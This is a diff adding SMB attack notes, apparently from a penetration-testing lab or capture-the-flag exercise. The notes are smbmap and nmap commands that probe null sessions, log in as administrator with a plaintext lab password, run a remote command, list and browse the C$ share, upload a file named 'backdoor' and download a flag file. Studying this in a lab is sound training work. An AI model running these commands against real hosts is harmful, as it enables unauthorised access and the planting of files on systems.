@@ -219,6 +219,20 @@ nmap -p445 --script smb-enum-services --script-args smbusername=administrator,sm
 nmap -p445 --script smb-enum-share,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45
 
 
+smb map
+
+ping 10.4.26.58
+nmap -p445 --script smb-protocols 10.4.26.58
+smbmap -u guest -p "" -d . -H 10.4.26.58 // null sessions
+smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
+smbmap -H 10.4.26.58 -u administrator -p smbserver_771 -x 'ipconfig'
+smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -L
+smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -r 'c$'
+touch backdoor
+smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'c$\backdoor' //upload file
+smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' --download 'c$\flag.txt' //download file
+
+
 
 
 
